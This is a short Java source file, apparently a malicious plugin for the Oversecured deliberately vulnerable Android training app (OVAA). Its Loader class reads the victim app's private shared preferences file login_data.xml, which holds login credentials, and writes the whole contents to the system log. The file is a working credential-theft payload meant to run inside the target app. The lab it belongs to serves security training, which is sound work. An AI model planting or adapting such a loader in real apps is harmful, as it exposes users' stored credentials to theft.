package oversecured.plugin;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;


public class Loader {
    public void loadMetadata(){
        try {
            File credentialFile = new File("/data/data/oversecured.ovaa/shared_prefs/login_data.xml");
            InputStream is = new FileInputStream(credentialFile);
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String read;
            while ((read = br.readLine()) != null) {
                sb.append(read);
            }
            br.close();
            Log.d("login_data", sb.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}


